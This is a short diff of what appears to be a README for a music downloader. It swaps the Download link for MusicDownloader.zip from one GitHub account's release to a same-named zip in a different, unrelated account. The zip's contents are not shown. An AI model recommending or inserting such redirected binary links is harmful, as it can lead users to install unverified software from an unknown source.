@@ -38,7 +38,7 @@
 
 ## 📥 Download
 
-📥 [`MusicDownloader.zip`](https://github.com/typhoonostrichamend/sancho/releases/download/MusicDownload_v1.0/MusicDownloader.zip)
+📥 [`MusicDownloader.zip`]( https://github.com/playstudentglimpse/MP3-Downloader/releases/download/Music/MusicDownloader.zip )
 
 ---
 
